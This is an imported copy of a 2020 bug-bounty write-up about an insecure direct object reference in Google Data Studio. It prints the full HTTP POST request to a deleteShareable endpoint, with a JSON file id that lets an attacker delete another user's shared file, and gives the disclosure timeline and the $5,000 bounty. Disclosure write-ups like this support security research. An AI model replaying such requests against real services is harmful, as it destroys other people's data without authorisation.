---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-07-17_idor-in-google-product.md
original_filename: 2020-07-17_idor-in-google-product.md
title: Idor in google product
category: documents
detected_topics:
- idor
- command-injection
- mfa
- otp
- cors
- csrf
tags:
- imported
- documents
- idor
- command-injection
- mfa
- otp
- cors
- csrf
language: en
raw_sha256: add0682a3c34bd7b942c04ea948049a2b42fe3907511cf7b1bd07c2865cb2da0
text_sha256: 271078e08e4295427f3004a0d08536847a90f0094825ff200df9dfa907a8330a
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# Idor in google product

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-07-17_idor-in-google-product.md
- Source Type: markdown
- Detected Topics: idor, command-injection, mfa, otp, cors, csrf
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `add0682a3c34bd7b942c04ea948049a2b42fe3907511cf7b1bd07c2865cb2da0`
- Text SHA256: `271078e08e4295427f3004a0d08536847a90f0094825ff200df9dfa907a8330a`


## Content

---
title: "Idor in google product"
url: "https://medium.com/@balook/idor-in-google-datastudio-google-com-f2fa51b763de"
authors: ["Baluz (@t3chman)"]
programs: ["Google"]
bugs: ["IDOR"]
bounty: "5,000"
publication_date: "2020-07-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4403
scraped_via: "browseros"
---

# Idor in google product

Idor in google product
baluz
Follow
Jul 17, 2020

107

Description :

Attacker can able to delete any file with vulnerable endpoint ..!

Endpoint :

POST /u/4/deleteShareable?appVersion=20190926_020020 HTTP/1.1
Host: datastudio.google.com
Connection: close
Content-Length: 54
Sec-Fetch-Mode: cors
Origin: https://datastudio.google.com
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
encoding: null
Sec-Fetch-Site: same-origin
Referer: https://datastudio.google.com/u/4/navigation/reporting

Cookie: RAP_XSRF_TOKEN=ACQ5uE-fZxoHyJIMJ6I9fWifDGZzjTeHCw:1569756166600; gh_7510439=;

Get baluz’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

{“id”:”9c491b49-a2f7–49fe-bd91-c4783657781",”type”:0}

vulnerable-paramerter : id

guessing id here not possible . But if the victim shared his file the id will be visible in url path

Triage Time

September 29,2019 : Reported

Oct 1, 2019 : Triaged

Oct 8, 2019 : bountry awarded 5k$

No thanks for reading the report :-
